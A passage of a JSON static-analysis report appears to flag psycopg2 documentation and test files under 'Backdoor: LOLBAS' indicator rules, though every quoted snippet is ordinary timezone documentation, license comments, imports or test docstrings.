          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 592,
                  "startColumn": 28,
                  "endLine": 592,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n        >>> cur.execute(\"SET TIME ZONE 'Asia/Calcutta'\")  # offset was +5:21:10\n        >>> cur.execute(\"SELECT '1900-01-01 10:30:45'::timestamptz\")\n        >>> cur.fetchone()[0].tzinfo\n        # On Python 3.6: 5h, 21m\n",
                    "rendered": {
                      "text": "    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n        >>> cur.execute(\"SET TIME ZONE 'Asia/Calcutta'\")  # offset was +5:21:10\n        >>> cur.execute(\"SELECT '1900-01-01 10:30:45'::timestamptz\")\n        >>> cur.fetchone()[0].tzinfo\n        # On Python 3.6: 5h, 21m\n",
                      "markdown": "`    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n        >>> cur.execute(\"SET TIME ZONE 'Asia/Calcutta'\")  # offset was +5:21:10\n        >>> cur.execute(\"SELECT '1900-01-01 10:30:45'::timestamptz\")\n        >>> cur.fetchone()[0].tzinfo\n        # On Python 3.6: 5h, 21m\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 589,
                  "startColumn": 21,
                  "endLine": 589,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n    Before Python 3.7, the `datetime` module only supported timezones with an\n    integer number of minutes. A few historical time zones had seconds in the\n    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n        >>> cur.execute(\"SET TIME ZONE 'Asia/Calcutta'\")  # offset was +5:21:10\n",
                    "rendered": {
                      "text": "\n    Before Python 3.7, the `datetime` module only supported timezones with an\n    integer number of minutes. A few historical time zones had seconds in the\n    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n        >>> cur.execute(\"SET TIME ZONE 'Asia/Calcutta'\")  # offset was +5:21:10\n",
                      "markdown": "`\n    Before Python 3.7, the `datetime` module only supported timezones with an\n    integer number of minutes. A few historical time zones had seconds in the\n    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n        >>> cur.execute(\"SET TIME ZONE 'Asia/Calcutta'\")  # offset was +5:21:10\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 588,
                  "startColumn": 47,
                  "endLine": 588,
                  "endColumn": 53,
                  "snippet": {
                    "text": ".. note::\n\n    Before Python 3.7, the `datetime` module only supported timezones with an\n    integer number of minutes. A few historical time zones had seconds in the\n    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n",
                    "rendered": {
                      "text": ".. note::\n\n    Before Python 3.7, the `datetime` module only supported timezones with an\n    integer number of minutes. A few historical time zones had seconds in the\n    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n",
                      "markdown": "`.. note::\n\n    Before Python 3.7, the `datetime` module only supported timezones with an\n    integer number of minutes. A few historical time zones had seconds in the\n    UTC offset: these time zones will have the offset rounded to the nearest\n    minute, with an error of up to 30 seconds, on Python versions before 3.7.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 579,
                  "startColumn": 24,
                  "endLine": 579,
                  "endColumn": 30,
                  "snippet": {
                    "text": "The PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n:sql:`timestamptz`) is converted into Python `~datetime.datetime` objects.\n\n    >>> cur.execute(\"SET TIME ZONE 'Europe/Rome'\")  # UTC + 1 hour\n    >>> cur.execute(\"SELECT '2010-01-01 10:30:45'::timestamptz\")\n    >>> cur.fetchone()[0]\n    datetime.datetime(2010, 1, 1, 10, 30, 45,\n",
                    "rendered": {
                      "text": "The PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n:sql:`timestamptz`) is converted into Python `~datetime.datetime` objects.\n\n    >>> cur.execute(\"SET TIME ZONE 'Europe/Rome'\")  # UTC + 1 hour\n    >>> cur.execute(\"SELECT '2010-01-01 10:30:45'::timestamptz\")\n    >>> cur.fetchone()[0]\n    datetime.datetime(2010, 1, 1, 10, 30, 45,\n",
                      "markdown": "`The PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n:sql:`timestamptz`) is converted into Python `~datetime.datetime` objects.\n\n    >>> cur.execute(\"SET TIME ZONE 'Europe/Rome'\")  # UTC + 1 hour\n    >>> cur.execute(\"SELECT '2010-01-01 10:30:45'::timestamptz\")\n    >>> cur.fetchone()[0]\n    datetime.datetime(2010, 1, 1, 10, 30, 45,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 576,
                  "startColumn": 40,
                  "endLine": 576,
                  "endColumn": 46,
                  "snippet": {
                    "text": "Time zones handling\n'''''''''''''''''''\n\nThe PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n:sql:`timestamptz`) is converted into Python `~datetime.datetime` objects.\n\n    >>> cur.execute(\"SET TIME ZONE 'Europe/Rome'\")  # UTC + 1 hour\n",
                    "rendered": {
                      "text": "Time zones handling\n'''''''''''''''''''\n\nThe PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n:sql:`timestamptz`) is converted into Python `~datetime.datetime` objects.\n\n    >>> cur.execute(\"SET TIME ZONE 'Europe/Rome'\")  # UTC + 1 hour\n",
                      "markdown": "`Time zones handling\n'''''''''''''''''''\n\nThe PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n:sql:`timestamptz`) is converted into Python `~datetime.datetime` objects.\n\n    >>> cur.execute(\"SET TIME ZONE 'Europe/Rome'\")  # UTC + 1 hour\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 572,
                  "endLine": 573,
                  "endColumn": 5,
                  "snippet": {
                    "text": "    single: Time Zones\n\n.. _tz-handling:\n\nTime zones handling\n'''''''''''''''''''\n\nThe PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n",
                    "rendered": {
                      "text": "    single: Time Zones\n\n.. _tz-handling:\n\nTime zones handling\n'''''''''''''''''''\n\nThe PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n",
                      "markdown": "`    single: Time Zones\n\n.. _tz-handling:\n\nTime zones handling\n'''''''''''''''''''\n\nThe PostgreSQL type :sql:`timestamp with time zone` (a.k.a.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 569,
                  "startColumn": 11,
                  "endLine": 569,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n\n.. index::\n    single: Time Zones\n\n.. _tz-handling:\n\n",
                    "rendered": {
                      "text": "\n\n.. index::\n    single: Time Zones\n\n.. _tz-handling:\n\n",
                      "markdown": "`\n\n.. index::\n    single: Time Zones\n\n.. _tz-handling:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 551,
                  "startColumn": 79,
                  "endLine": 552,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nPython builtin `~datetime.datetime`, `~datetime.date`,\n`~datetime.time`,  `~datetime.timedelta` are converted into PostgreSQL's\n:sql:`timestamp[tz]`, :sql:`date`, :sql:`time[tz]`, :sql:`interval` data types.\nTime zones are supported too.\n\n    >>> dt = datetime.datetime.now()\n    >>> dt\n",
                    "rendered": {
                      "text": "\nPython builtin `~datetime.datetime`, `~datetime.date`,\n`~datetime.time`,  `~datetime.timedelta` are converted into PostgreSQL's\n:sql:`timestamp[tz]`, :sql:`date`, :sql:`time[tz]`, :sql:`interval` data types.\nTime zones are supported too.\n\n    >>> dt = datetime.datetime.now()\n    >>> dt\n",
                      "markdown": "`\nPython builtin `~datetime.datetime`, `~datetime.date`,\n`~datetime.time`,  `~datetime.timedelta` are converted into PostgreSQL's\n:sql:`timestamp[tz]`, :sql:`date`, :sql:`time[tz]`, :sql:`interval` data types.\nTime zones are supported too.\n\n    >>> dt = datetime.datetime.now()\n    >>> dt\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 541,
                  "startColumn": 11,
                  "endLine": 541,
                  "endColumn": 17,
                  "snippet": {
                    "text": ".. index::\n    single: Adaptation; Date/Time objects\n    single: Date objects; Adaptation\n    single: Time objects; Adaptation\n    single: Interval objects; Adaptation\n\n.. _adapt-date:\n",
                    "rendered": {
                      "text": ".. index::\n    single: Adaptation; Date/Time objects\n    single: Date objects; Adaptation\n    single: Time objects; Adaptation\n    single: Interval objects; Adaptation\n\n.. _adapt-date:\n",
                      "markdown": "`.. index::\n    single: Adaptation; Date/Time objects\n    single: Date objects; Adaptation\n    single: Time objects; Adaptation\n    single: Interval objects; Adaptation\n\n.. _adapt-date:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/src/usage.rst"
                },
                "region": {
                  "startLine": 325,
                  "startColumn": 53,
                  "endLine": 325,
                  "endColumn": 59,
                  "snippet": {
                    "text": ".. |tm| unicode:: U+2122\n\nThe mapping is fairly customizable: see :ref:`adapting-new-types` and\n:ref:`type-casting-from-sql-to-python`.  You can also find a few other\nspecialized adapters in the `psycopg2.extras` module.\n\n\n",
                    "rendered": {
                      "text": ".. |tm| unicode:: U+2122\n\nThe mapping is fairly customizable: see :ref:`adapting-new-types` and\n:ref:`type-casting-from-sql-to-python`.  You can also find a few other\nspecialized adapters in the `psycopg2.extras` module.\n\n\n",
                      "markdown": "`.. |tm| unicode:: U+2122\n\nThe mapping is fairly customizable: see :ref:`adapting-new-types` and\n:ref:`type-casting-from-sql-to-python`.  You can also find a few other\nspecialized adapters in the `psycopg2.extras` module.\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_sql.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_sql.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_ipaddress.py"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 3,
                  "endLine": 30,
                  "endColumn": 7,
                  "snippet": {
                    "text": "    import ipaddress as ip\nexcept ImportError:\n    # Python 2\n    ip = None\n\n\n@unittest.skipIf(ip is None, \"'ipaddress' module not available\")\n",
                    "rendered": {
                      "text": "    import ipaddress as ip\nexcept ImportError:\n    # Python 2\n    ip = None\n\n\n@unittest.skipIf(ip is None, \"'ipaddress' module not available\")\n",
                      "markdown": "`    import ipaddress as ip\nexcept ImportError:\n    # Python 2\n    ip = None\n\n\n@unittest.skipIf(ip is None, \"'ipaddress' module not available\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_ipaddress.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 23,
                  "endLine": 28,
                  "snippet": {
                    "text": "import psycopg2.extras\n\ntry:\n    import ipaddress as ip\nexcept ImportError:\n    # Python 2\n    ip = None\n\n",
                    "rendered": {
                      "text": "import psycopg2.extras\n\ntry:\n    import ipaddress as ip\nexcept ImportError:\n    # Python 2\n    ip = None\n\n",
                      "markdown": "`import psycopg2.extras\n\ntry:\n    import ipaddress as ip\nexcept ImportError:\n    # Python 2\n    ip = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_async.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 6,
                  "endLine": 28,
                  "snippet": {
                    "text": "# License for more details.\n\nimport gc\nimport time\nimport unittest\nimport warnings\n\nimport psycopg2\n",
                    "rendered": {
                      "text": "# License for more details.\n\nimport gc\nimport time\nimport unittest\nimport warnings\n\nimport psycopg2\n",
                      "markdown": "`# License for more details.\n\nimport gc\nimport time\nimport unittest\nimport warnings\n\nimport psycopg2\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_async.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_async.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_quote.py"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 33,
                  "endLine": 45,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n    This test case checks that the E'' quotes are used whenever they are\n    needed. The tests are expected to pass with all PostgreSQL server versions\n    (currently tested with 7.4 <= PG <= 8.3beta) and with any\n    'standard_conforming_strings' server parameter value.\n    The tests also check that no warning is raised ('escape_string_warning'\n    should be on).\n",
                    "rendered": {
                      "text": "\n    This test case checks that the E'' quotes are used whenever they are\n    needed. The tests are expected to pass with all PostgreSQL server versions\n    (currently tested with 7.4 <= PG <= 8.3beta) and with any\n    'standard_conforming_strings' server parameter value.\n    The tests also check that no warning is raised ('escape_string_warning'\n    should be on).\n",
                      "markdown": "`\n    This test case checks that the E'' quotes are used whenever they are\n    needed. The tests are expected to pass with all PostgreSQL server versions\n    (currently tested with 7.4 <= PG <= 8.3beta) and with any\n    'standard_conforming_strings' server parameter value.\n    The tests also check that no warning is raised ('escape_string_warning'\n    should be on).\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_quote.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 63,
                  "endLine": 40,
                  "endColumn": 67,
                  "snippet": {
                    "text": "\n    Since ver. 8.1, PostgreSQL is moving towards SQL standard conforming\n    strings, where the backslash (\\) is treated as literal character,\n    not as escape. To treat the backslash as a C-style escapes, PG supports\n    the E'' quotes.\n\n    This test case checks that the E'' quotes are used whenever they are\n",
                    "rendered": {
                      "text": "\n    Since ver. 8.1, PostgreSQL is moving towards SQL standard conforming\n    strings, where the backslash (\\) is treated as literal character,\n    not as escape. To treat the backslash as a C-style escapes, PG supports\n    the E'' quotes.\n\n    This test case checks that the E'' quotes are used whenever they are\n",
                      "markdown": "`\n    Since ver. 8.1, PostgreSQL is moving towards SQL standard conforming\n    strings, where the backslash (\\) is treated as literal character,\n    not as escape. To treat the backslash as a C-style escapes, PG supports\n    the E'' quotes.\n\n    This test case checks that the E'' quotes are used whenever they are\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_quote.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_quote.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_extras.py"
                },
                "region": {
                  "startLine": 1585,
                  "startColumn": 28,
                  "endLine": 1585,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        for i, r in enumerate(ranges):\n            # not all the ranges make sense:\n            # fun fact: select ascii('#') < ascii('$'), '#' < '$'\n            # yelds... t, f! At least in en_GB.UTF-8 collation.\n            # which seems suggesting a supremacy of the pound on the dollar.\n            # So some of these ranges will fail to insert. Be prepared but...\n            try:\n",
                    "rendered": {
                      "text": "        for i, r in enumerate(ranges):\n            # not all the ranges make sense:\n            # fun fact: select ascii('#') < ascii('$'), '#' < '$'\n            # yelds... t, f! At least in en_GB.UTF-8 collation.\n            # which seems suggesting a supremacy of the pound on the dollar.\n            # So some of these ranges will fail to insert. Be prepared but...\n            try:\n",
                      "markdown": "`        for i, r in enumerate(ranges):\n            # not all the ranges make sense:\n            # fun fact: select ascii('#') < ascii('$'), '#' < '$'\n            # yelds... t, f! At least in en_GB.UTF-8 collation.\n            # which seems suggesting a supremacy of the pound on the dollar.\n            # So some of these ranges will fail to insert. Be prepared but...\n            try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_types_extras.py"
                },
                "region": {
                  "startLine": 1598,
                  "startColumn": 43,
                  "endLine": 1598,
                  "endColumn": 49,
                  "snippet": {
